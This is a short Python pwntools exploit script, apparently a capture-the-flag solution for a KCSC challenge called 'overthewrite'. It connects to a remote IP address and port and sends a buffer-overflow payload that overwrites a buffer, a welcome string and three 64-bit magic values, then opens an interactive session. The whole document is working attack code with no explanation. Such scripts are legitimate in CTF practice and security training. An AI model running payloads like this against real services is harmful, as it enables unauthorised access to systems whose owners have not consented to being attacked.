from pwn import *
context.log_level       = "DEBUG"
context.arch            = "amd64"
#p = process("./overthewrite")
p = remote("146.190.115.228", 9992)



payload = b"a"*0x20 + b"Welcome to KCSC\x00        " + p64(0x215241104735F10F) + p64(0xDEADBEEFCAFEBABE) +p64(0x1337133700000000)
p.sendline(payload)
p.interactive()

